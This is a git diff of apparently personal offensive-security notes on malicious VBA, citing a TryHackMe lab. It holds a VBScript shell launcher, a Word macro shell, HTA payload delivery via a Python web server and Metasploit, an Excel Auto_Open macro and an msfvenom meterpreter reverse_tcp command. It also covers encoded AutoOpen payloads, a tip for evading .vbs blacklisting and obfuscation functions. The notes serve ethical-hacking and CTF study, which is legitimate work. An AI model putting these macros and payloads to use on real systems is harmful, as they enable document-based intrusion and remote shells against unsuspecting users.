@@ -2,16 +2,16 @@
 
 Beware these uses for VBA, if you find code like this on your computer tell a member of IT. I don't how you got here, unless you have good ethical hacking reasons in which case enjoy true horror of VBA scripts, as many as I find and explain their cool use cases.
 
-#  VB script shell:
+VB script shell:
 ```vb
 Set shell = WScript.CreateObject("Wscript.Shell")
 shell.Run("C:\Windows\System32\cmd.exe " & WScript.ScriptFullName),0,True
 ```
 If .vbs is blacklisted run using wscript /e:VBScript with a rename to script.txt 
 
-# Visual Basic 4 Apps 
+## Visual Basic 4 Apps 
 
-### Word Macro shell:
+#### Word Macro shell:
 ```vb
 Sub PoC()
 	Dim payload As String
@@ -20,7 +20,7 @@ Sub PoC()
 End Sub
 ```
 
-### HTML application:
+#### HTML application:
 
 Also known as HTA, these are dynamic html pages host with a python3 -m http.sever 1337
 ```html
@@ -46,7 +46,7 @@ metasploit: msfconsole -q
 use exploit/windows/misc/hta_server
 ```
 
-### Excel HTA
+#### Excel HTA
 
 Excel HTA macro from THM Throwback
 
@@ -60,13 +60,13 @@ Sub Auto_Open()
 End Sub
 ```
 
-### Metasploit VBA
+#### Metasploit VBA
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba
 ```
 
-# Encoded Payloads
+#### Encoded Payloads
 
 ```vb
 Sub AutoOpen()
@@ -88,3 +88,24 @@ Sub MyMacro()
     CreateObject("Wscript.Shell").Run Str
 End Sub
 ```
+
+#### Obfuscation
+
+[[Obfuscation-Principles]]
+
+
+```vb
+ChrW() ' Returns the Unicode character that corresponds to the specified character code
+CBool() ' convert to a boolean
+Len() ' returns the number of characters in a text string.
+LenB() ' returns the number of bytes used to represent the characters in a text string
+Trim() ' Trims both leading and tailing string expressions
+```
+
+https://support.microsoft.com/en-gb/office/len-lenb-functions-29236f94-cedc-429d-affd-b5e33d2c67cb
+https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ltrim-rtrim-and-trim-functions
+https://learn.microsoft.com/en-us/office/vba/language/concepts/getting-started/type-conversion-functions
+https://help.libreoffice.org/latest/ro/text/sbasic/shared/03120112.html
+
+## References
+
